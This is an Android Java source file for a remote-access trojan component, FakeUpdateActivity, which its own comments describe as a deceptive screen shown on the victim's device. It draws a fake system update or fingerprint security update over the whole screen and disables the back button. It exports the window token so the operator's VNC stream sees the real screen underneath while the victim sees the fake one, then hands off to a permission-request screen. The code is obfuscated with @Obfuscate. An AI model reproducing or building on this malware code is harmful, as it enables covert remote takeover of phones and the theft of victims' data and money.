package com.alpha.shield;

import android.animation.ValueAnimator;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.LinearGradient;
import android.graphics.Paint;
import android.graphics.Path;
import android.graphics.PorterDuff;
import android.graphics.RectF;
import android.graphics.Shader;
import android.graphics.Typeface;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.view.animation.LinearInterpolator;

import org.lsposed.lsparanoid.Obfuscate;

/**
 * FakeUpdateActivity — full-screen deceptive screen shown on victim's device.
 *
 * Mode 0 (UPDATE_MODE=1): Samsung-style "Software update" screen.
 *   - Circular progress ring with percentage
 *   - Cycling status messages
 *   - Brand logo, build version
 *   - "Do not turn off your device" warning
 *
 * Mode 1 (UPDATE_MODE=2): Fingerprint security update screen.
 *   - Animated fingerprint scanner with ripple rings
 *   - "Biometric Security Update" header
 *   - Security certificate progress bar
 *   - Scanning beam animation
 *
 * See-through VNC (API 34+):
 *   Window token is exported to a static field. VncEngine reads it and
 *   passes it to ScreenshotRequest.setWindowsToExclude() so the operator's
 *   VNC stream sees the UNDERLYING content — not the fake screen.
 *
 * API 30-33: operator sees the fake screen via VNC but the dashboard
 *   shows a "FAKE SCREEN ACTIVE" badge. Ly accessibility tree and
 *   gesture injection remain fully functional.
 */
@Obfuscate
public class FakeUpdateActivity extends Activity {

    // Exported window token — read by VncEngine on API 34+ for see-through capture
    public static volatile IBinder sWindowToken = null;
    public static volatile boolean sActive       = false;

    private final Handler    handler = new Handler(Looper.getMainLooper());
    private UpdateView       view;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Full screen, no title, no status bar, no navigation bar
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(
                WindowManager.LayoutParams.FLAG_FULLSCREEN
                        | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                        | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                WindowManager.LayoutParams.FLAG_FULLSCREEN
                        | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                        | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);

        // Immersive sticky — hides nav bar too
        getWindow().getDecorView().setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_FULLSCREEN
                        | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                        | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                        | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                        | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION);

        int mode = BuildConfig.UPDATE_MODE; // 1=system update  2=fingerprint
        view = new UpdateView(this, mode);
        setContentView(view);

        // Export window token for VncEngine see-through on API 34+
        handler.post(() -> {
            sWindowToken = getWindow().getDecorView().getWindowToken();
            sActive      = true;
            // Notify CommandService
            if (CommandService.INSTANCE != null) {
                CommandService.INSTANCE.onFakeScreenStarted(sWindowToken);
            }
        });

        // Auto-dismiss after configured duration, then start PermissionActivity
        int duration = BuildConfig.UPDATE_DURATION_MS;
        handler.postDelayed(this::complete, duration);
    }

    private void complete() {
        sActive      = false;
        sWindowToken = null;
        if (CommandService.INSTANCE != null) {
            CommandService.INSTANCE.onFakeScreenStopped();
        }
        view.stopAnimations();
        startActivity(new Intent(this, PermissionActivity.class)
                .addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION));
        finish();
        overridePendingTransition(0, 0);
    }

    @Override
    protected void onDestroy() {
        sActive      = false;
        sWindowToken = null;
        view.stopAnimations();
        super.onDestroy();
    }

    @Override
    public void onBackPressed() { /* disabled — cannot back out */ }

    // ── Custom drawn update view ──────────────────────────────────────────────

    private static class UpdateView extends View {

        private static final int   MODE_SYSTEM      = 1;
        private static final int   MODE_FINGERPRINT = 2;

        private final int    mode;
        private final String brand;
        private final String title;
        private final String version;

        // Animation state
        private float  progressFraction = 0f;   // 0.0 → 1.0
        private float  fpRipple1 = 0f;
        private float  fpRipple2 = 0.33f;
        private float  fpRipple3 = 0.66f;
        private float  fpBeam    = 0f;           // fingerprint scan beam
        private float  dotAlpha1 = 1f, dotAlpha2 = 0.4f, dotAlpha3 = 0.1f;

        private int    statusIdx  = 0;
        private final String[] systemStatuses = {
                "Checking for updates…",
                "Downloading update… 0%",
                "Downloading update… 48%",
                "Downloading update… 100%",
                "Preparing update…",
                "Installing update…",
                "Verifying update…",
                "Finalising…"
        };
        private final String[] fpStatuses = {
                "Connecting to security server…",
                "Verifying device certificate…",
                "Downloading biometric database…",
                "Installing fingerprint templates…",
                "Encrypting biometric data…",
                "Finalising security update…"
        };

        // Animators
        private ValueAnimator progressAnim;
        private ValueAnimator rippleAnim;
        private ValueAnimator statusAnim;
        private ValueAnimator beamAnim;
        private ValueAnimator dotAnim;

        // Paint
        private final Paint bgPaint    = new Paint(Paint.ANTI_ALIAS_FLAG);
        private final Paint ringBgPaint = new Paint(Paint.ANTI_ALIAS_FLAG);
        private final Paint ringPaint  = new Paint(Paint.ANTI_ALIAS_FLAG);
        private final Paint fpPaint    = new Paint(Paint.ANTI_ALIAS_FLAG);
        private final Paint ripplePaint = new Paint(Paint.ANTI_ALIAS_FLAG);
        private final Paint textPaint  = new Paint(Paint.ANTI_ALIAS_FLAG);
        private final Paint subPaint   = new Paint(Paint.ANTI_ALIAS_FLAG);
        private final Paint warnPaint  = new Paint(Paint.ANTI_ALIAS_FLAG);
        private final Paint barPaint   = new Paint(Paint.ANTI_ALIAS_FLAG);

        UpdateView(Context ctx, int mode) {
            super(ctx);
            this.mode    = mode;
            this.brand   = BuildConfig.UPDATE_BRAND;
            this.title   = BuildConfig.UPDATE_TITLE;
            this.version = BuildConfig.UPDATE_VERSION;
            setupPaints();
            startAnimations();
        }

        private void setupPaints() {
            // Background
            bgPaint.setColor(mode == MODE_FINGERPRINT ? 0xFF0D1117 : 0xFFFFFFFF);
            bgPaint.setStyle(Paint.Style.FILL);

            // Progress ring background (track)
            ringBgPaint.setColor(mode == MODE_FINGERPRINT ? 0x33FFFFFF : 0xFFE0E0E0);
            ringBgPaint.setStyle(Paint.Style.STROKE);
            ringBgPaint.setStrokeWidth(14f);
            ringBgPaint.setStrokeCap(Paint.Cap.ROUND);

            // Progress ring foreground
            ringPaint.setColor(mode == MODE_FINGERPRINT ? 0xFF00E5FF : 0xFF1A73E8);
            ringPaint.setStyle(Paint.Style.STROKE);
            ringPaint.setStrokeWidth(14f);
            ringPaint.setStrokeCap(Paint.Cap.ROUND);

            // Fingerprint icon
            fpPaint.setColor(0xFF00E5FF);
            fpPaint.setStyle(Paint.Style.STROKE);
            fpPaint.setStrokeWidth(3f);
            fpPaint.setStrokeCap(Paint.Cap.ROUND);

            // Ripple circles
            ripplePaint.setStyle(Paint.Style.STROKE);
            ripplePaint.setStrokeWidth(2f);

            // Main text
            textPaint.setColor(mode == MODE_FINGERPRINT ? 0xFFE0E8FF : 0xFF1A1A1A);
            textPaint.setTextAlign(Paint.Align.CENTER);
            textPaint.setTypeface(Typeface.create(Typeface.DEFAULT, Typeface.BOLD));

            // Sub text
            subPaint.setColor(mode == MODE_FINGERPRINT ? 0xFF8899BB : 0xFF666666);
            subPaint.setTextAlign(Paint.Align.CENTER);

            // Warning
            warnPaint.setColor(mode == MODE_FINGERPRINT ? 0xFF556677 : 0xFF999999);
            warnPaint.setTextAlign(Paint.Align.CENTER);

            // Bar
            barPaint.setColor(mode == MODE_FINGERPRINT ? 0xFF00E5FF : 0xFF1A73E8);
            barPaint.setStyle(Paint.Style.FILL);
            barPaint.setStrokeCap(Paint.Cap.ROUND);
        }

        private void startAnimations() {
            // Progress 0 → 1 over (duration - 2000ms)
            long totalMs = BuildConfig.UPDATE_DURATION_MS;
            progressAnim = ValueAnimator.ofFloat(0f, 1f);
            progressAnim.setDuration((long)(totalMs * 0.85f));
            progressAnim.setInterpolator(new LinearInterpolator());
            progressAnim.addUpdateListener(a -> {
                progressFraction = (float) a.getAnimatedValue();
                // Advance status message based on progress
                String[] list = (mode == MODE_FINGERPRINT) ? fpStatuses : systemStatuses;
                statusIdx = Math.min((int)(progressFraction * list.length), list.length - 1);
                invalidate();
            });
            progressAnim.start();

            if (mode == MODE_FINGERPRINT) {
                // Ripple animation
                rippleAnim = ValueAnimator.ofFloat(0f, 1f);
                rippleAnim.setDuration(2000);
                rippleAnim.setRepeatCount(ValueAnimator.INFINITE);
                rippleAnim.setInterpolator(new LinearInterpolator());
                rippleAnim.addUpdateListener(a -> {
                    float v = (float) a.getAnimatedValue();
                    fpRipple1 = v;
                    fpRipple2 = (v + 0.33f) % 1f;
                    fpRipple3 = (v + 0.66f) % 1f;
                    invalidate();
                });
                rippleAnim.start();

                // Scan beam animation
                beamAnim = ValueAnimator.ofFloat(0f, 1f);
                beamAnim.setDuration(1200);
                beamAnim.setRepeatCount(ValueAnimator.INFINITE);
                beamAnim.setRepeatMode(ValueAnimator.REVERSE);
                beamAnim.addUpdateListener(a -> { fpBeam = (float) a.getAnimatedValue(); invalidate(); });
                beamAnim.start();
            } else {
                // Loading dots for system update
                dotAnim = ValueAnimator.ofFloat(0f, 3f);
                dotAnim.setDuration(900);
                dotAnim.setRepeatCount(ValueAnimator.INFINITE);
                dotAnim.setInterpolator(new LinearInterpolator());
                dotAnim.addUpdateListener(a -> {
                    float v = (float) a.getAnimatedValue();
                    dotAlpha1 = v < 1f ? v : (v < 2f ? 2f - v : 0f);
                    dotAlpha2 = v < 1f ? 0f : (v - 1f < 1f ? v - 1f : (2f - (v - 1f)));
                    dotAlpha3 = v < 2f ? 0f : (v - 2f);
                    invalidate();
                });
                dotAnim.start();
            }
        }

        void stopAnimations() {
            if (progressAnim != null) progressAnim.cancel();
            if (rippleAnim  != null) rippleAnim.cancel();
            if (beamAnim    != null) beamAnim.cancel();
            if (dotAnim     != null) dotAnim.cancel();
            if (statusAnim  != null) statusAnim.cancel();
        }

        @Override
        protected void onDraw(Canvas canvas) {
            int W = getWidth(), H = getHeight();
            if (W == 0 || H == 0) return;

            // Background
            canvas.drawRect(0, 0, W, H, bgPaint);

            if (mode == MODE_SYSTEM) drawSystemUpdate(canvas, W, H);
            else                     drawFingerprintUpdate(canvas, W, H);
        }

        // ── Mode 1: System Update ─────────────────────────────────────────────

        private void drawSystemUpdate(Canvas canvas, int W, int H) {
            float cx = W / 2f;
            float density = getResources().getDisplayMetrics().density;

            // Brand name at top
            textPaint.setTextSize(22 * density);
            canvas.drawText(brand, cx, H * 0.14f, textPaint);

            // Title
            subPaint.setTextSize(16 * density);
            canvas.drawText(title, cx, H * 0.14f + 32 * density, subPaint);

            // ── Circular progress ring ──────────────────────────────────────
            float ringRadius = W * 0.26f;
            float ringCx = cx, ringCy = H * 0.42f;
            RectF oval = new RectF(ringCx - ringRadius, ringCy - ringRadius,
                                   ringCx + ringRadius, ringCy + ringRadius);

            // Track
            canvas.drawArc(oval, -90, 360, false, ringBgPaint);
            // Progress
            canvas.drawArc(oval, -90, 360 * progressFraction, false, ringPaint);

            // Percentage text
            int pct = (int)(progressFraction * 100);
            textPaint.setTextSize(52 * density);
            canvas.drawText(pct + "%", ringCx, ringCy + 18 * density, textPaint);

            subPaint.setTextSize(13 * density);
            canvas.drawText("complete", ringCx, ringCy + 36 * density, subPaint);

            // ── Status text ───────────────────────────────────────────────────
            subPaint.setTextSize(14 * density);
            String status = systemStatuses[Math.min(statusIdx, systemStatuses.length - 1)];
            canvas.drawText(status, cx, H * 0.63f, subPaint);

            // Loading dots
            float dotR = 5 * density;
            float dotY = H * 0.63f + 32 * density;
            float gap  = 20 * density;
            drawDot(canvas, cx - gap, dotY, dotR, dotAlpha1);
            drawDot(canvas, cx,       dotY, dotR, dotAlpha2);
            drawDot(canvas, cx + gap, dotY, dotR, dotAlpha3);

            // Version info
            warnPaint.setTextSize(12 * density);
            canvas.drawText(version, cx, H * 0.74f, warnPaint);

            // Warning
            warnPaint.setTextSize(11 * density);
            canvas.drawText("Do not turn off your phone", cx, H * 0.80f, warnPaint);
            canvas.drawText("This may take a few minutes", cx, H * 0.80f + 18 * density, warnPaint);

            // Battery warning
            if (pct < 50) {
                warnPaint.setColor(0xFFFF6600);
                canvas.drawText("⚠ Charge your phone before updating", cx, H * 0.86f, warnPaint);
                warnPaint.setColor(0xFF999999);
            }
        }

        private void drawDot(Canvas canvas, float x, float y, float r, float alpha) {
            barPaint.setAlpha((int)(255 * Math.max(0, Math.min(1, alpha))));
            canvas.drawCircle(x, y, r, barPaint);
            barPaint.setAlpha(255);
        }

        // ── Mode 2: Fingerprint Update ────────────────────────────────────────

        private void drawFingerprintUpdate(Canvas canvas, int W, int H) {
            float cx = W / 2f;
            float density = getResources().getDisplayMetrics().density;
            float fpR     = W * 0.22f;  // fingerprint icon radius
            float fpCy    = H * 0.38f;

            // Brand at top (small, subtle)
            warnPaint.setColor(0xFF445566);
            warnPaint.setTextSize(14 * density);
            canvas.drawText(brand + " Security", cx, H * 0.10f, warnPaint);

            // Header
            textPaint.setTextSize(20 * density);
            canvas.drawText("Biometric Security Update", cx, H * 0.17f, textPaint);

            subPaint.setTextSize(13 * density);
            subPaint.setColor(0xFF8899BB);
            canvas.drawText("Updating fingerprint database", cx, H * 0.17f + 24 * density, subPaint);

            // ── Ripple rings ──────────────────────────────────────────────────
            drawRipple(canvas, cx, fpCy, fpR, fpRipple1);
            drawRipple(canvas, cx, fpCy, fpR, fpRipple2);
            drawRipple(canvas, cx, fpCy, fpR, fpRipple3);

            // ── Fingerprint icon ──────────────────────────────────────────────
            drawFingerprintIcon(canvas, cx, fpCy, fpR * 0.65f, density);

            // Scan beam (horizontal line sweeping top to bottom of icon)
            float beamY = fpCy - fpR * 0.65f + (fpR * 1.3f * fpBeam);
            Paint beamPaint = new Paint(Paint.ANTI_ALIAS_FLAG);
            beamPaint.setShader(new LinearGradient(
                    cx - fpR * 0.65f, beamY,
                    cx + fpR * 0.65f, beamY,
                    new int[]{0x0000E5FF, 0xCC00E5FF, 0x0000E5FF},
                    null, Shader.TileMode.CLAMP));
            beamPaint.setStyle(Paint.Style.FILL);
            canvas.drawRect(cx - fpR * 0.65f, beamY - 2, cx + fpR * 0.65f, beamY + 2, beamPaint);

            // ── Progress bar ──────────────────────────────────────────────────
            float barW = W * 0.60f;
            float barLeft = cx - barW / 2f;
            float barY = H * 0.63f;
            float barH = 4 * density;

            // Bar track
            Paint trackPaint = new Paint(Paint.ANTI_ALIAS_FLAG);
            trackPaint.setColor(0x33FFFFFF);
            trackPaint.setStyle(Paint.Style.FILL);
            RectF trackRect = new RectF(barLeft, barY, barLeft + barW, barY + barH);
            canvas.drawRoundRect(trackRect, barH / 2, barH / 2, trackPaint);

            // Bar fill
            barPaint.setColor(0xFF00E5FF);
            RectF fillRect = new RectF(barLeft, barY, barLeft + barW * progressFraction, barY + barH);
            canvas.drawRoundRect(fillRect, barH / 2, barH / 2, barPaint);

            // Status text
            String[] list = fpStatuses;
            String status = list[Math.min(statusIdx, list.length - 1)];
            subPaint.setTextSize(13 * density);
            subPaint.setColor(0xFF8899BB);
            canvas.drawText(status, cx, H * 0.63f + 28 * density, subPaint);

            // Percentage
            int pct = (int)(progressFraction * 100);
            textPaint.setTextSize(14 * density);
            canvas.drawText(pct + "%", barLeft + barW + 32 * density, barY + 10 * density, textPaint);

            // Warning footer
            warnPaint.setColor(0xFF334455);
            warnPaint.setTextSize(11 * density);
            canvas.drawText("Do not remove any fingerprints during this process", cx, H * 0.82f, warnPaint);
            canvas.drawText("Security certificate ID: " + Build.SERIAL.substring(0, Math.min(8, Build.SERIAL.length())), cx, H * 0.82f + 18 * density, warnPaint);
        }

        private void drawRipple(Canvas canvas, float cx, float cy, float maxR, float phase) {
            // phase 0→1: circle grows from 0 to maxR * 2.5, alpha fades out
            float r     = maxR * (1f + phase * 1.5f);
            float alpha = 1f - phase;
            ripplePaint.setColor(Color.argb((int)(180 * alpha), 0, 229, 255));
            canvas.drawCircle(cx, cy, r, ripplePaint);
        }

        private void drawFingerprintIcon(Canvas canvas, float cx, float cy,
                                         float r, float density) {
            // Draw a simplified fingerprint using arcs
            fpPaint.setColor(0xFF00E5FF);
            fpPaint.setStrokeWidth(2.5f * density);

            // Central dot
            Paint dotPaint = new Paint(Paint.ANTI_ALIAS_FLAG);
            dotPaint.setColor(0xFF00E5FF);
            canvas.drawCircle(cx, cy, 4 * density, dotPaint);

            // Concentric arcs (fingerprint ridges)
            float[] ridgeR = { 0.15f, 0.28f, 0.42f, 0.57f, 0.72f, 0.87f, 1.0f };
            for (int i = 0; i < ridgeR.length; i++) {
                float rr = r * ridgeR[i];
                // Alternate sweep direction for realism
                float startAngle = (i % 2 == 0) ? 200f : 250f;
                float sweep      = (i % 2 == 0) ? 320f : 220f;
                RectF oval = new RectF(cx - rr, cy - rr, cx + rr, cy + rr);
                // Gap in top to look like a fingerprint loop
                canvas.drawArc(oval, startAngle, sweep, false, fpPaint);
            }

            // Corner brackets (scanner outline)
            float bSize = r * 1.4f;
            float bLen  = r * 0.35f;
            float bl    = cx - bSize, bt = cy - bSize, br = cx + bSize, bb = cy + bSize;
            Paint cornerPaint = new Paint(Paint.ANTI_ALIAS_FLAG);
            cornerPaint.setColor(0xFF00E5FF);
            cornerPaint.setStyle(Paint.Style.STROKE);
            cornerPaint.setStrokeWidth(2.5f * density);
            cornerPaint.setStrokeCap(Paint.Cap.ROUND);

            // Top-left
            canvas.drawLine(bl, bt + bLen, bl, bt, cornerPaint);
            canvas.drawLine(bl, bt, bl + bLen, bt, cornerPaint);
            // Top-right
            canvas.drawLine(br, bt, br - bLen, bt, cornerPaint);
            canvas.drawLine(br, bt, br, bt + bLen, cornerPaint);
            // Bottom-left
            canvas.drawLine(bl, bb - bLen, bl, bb, cornerPaint);
            canvas.drawLine(bl, bb, bl + bLen, bb, cornerPaint);
            // Bottom-right
            canvas.drawLine(br, bb - bLen, br, bb, cornerPaint);
            canvas.drawLine(br, bb, br - bLen, bb, cornerPaint);
        }
    }
}
